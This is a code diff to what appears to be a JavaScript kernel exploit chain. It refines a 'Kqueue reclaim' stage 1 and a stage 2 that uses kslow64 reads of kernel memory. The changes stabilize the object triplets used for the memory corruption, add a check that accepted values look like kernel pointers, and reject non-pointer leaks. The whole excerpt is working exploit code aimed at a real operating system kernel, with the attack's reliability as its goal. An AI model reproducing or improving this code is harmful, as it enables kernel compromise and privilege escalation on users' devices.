@@ -1460,6 +1460,10 @@
             return null;
         }
 
+        function is_kernel_ptr(v) {
+            return v !== 0n && (v >> 48n) === 0xFFFFn;
+        }
+
         async function stage1(S) {
             breadcrumb("stage1:start triplets=" + S.triplets.join(","));
             send_notification("Stage 1\nKqueue reclaim");
@@ -1515,12 +1519,18 @@
             const stabilize_stage2_triplets = async (label) => {
                 const before = S.triplets.join(",");
                 for (let pass = 0; pass < 2; pass++) {
-                    const t1 = find_triplet(S, S.triplets[0], S.triplets[2], 50000);
-                    if (t1 !== -1) S.triplets[1] = t1;
+                    const old1 = S.triplets[1];
+                    const old2 = S.triplets[2];
+                    const t1 = find_triplet(S, S.triplets[0], old2, 50000);
                     syscall(SYSCALL.sched_yield);
-                    const t2 = find_triplet(S, S.triplets[0], S.triplets[1], 50000);
-                    if (t2 !== -1) S.triplets[2] = t2;
-                    if (t1 !== -1 && t2 !== -1 && triplets_valid(S)) {
+                    const t2 = t1 !== -1
+                        ? find_triplet(S, S.triplets[0], t1, 50000)
+                        : -1;
+                    if (t1 !== -1 && t2 !== -1 &&
+                        t1 !== S.triplets[0] && t2 !== S.triplets[0] &&
+                        t1 !== t2) {
+                        S.triplets[1] = t1;
+                        S.triplets[2] = t2;
                         const after = S.triplets.join(",");
                         if (after !== before) {
                             await ulog("stage2: stabilized triplets for " +
@@ -1528,6 +1538,8 @@
                         }
                         return true;
                     }
+                    S.triplets[1] = old1;
+                    S.triplets[2] = old2;
                     nanosleep_ms(10);
                 }
                 await ulog("stage2: triplet stabilize failed for " + label +
@@ -1541,9 +1553,14 @@
                     " triplets=" + S.triplets.join(","));
                 const val = kslow64(S, kaddr);
                 const elapsed = Date.now() - t0;
-                if (val) {
+                if (is_kernel_ptr(val)) {
                     await ulog("stage2: " + name + "=" + toHex(val) +
                         " (" + elapsed + "ms, " + S.kslow_last_reason + ")");
+                } else if (val) {
+                    await ulog("stage2: " + name + " rejected non-kptr " +
+                        toHex(val) + " (" + elapsed + "ms, " +
+                        S.kslow_last_reason + ")");
+                    return null;
                 } else {
                     await ulog("stage2: " + name + " read failed (" +
                         elapsed + "ms, " + S.kslow_last_reason + ")");
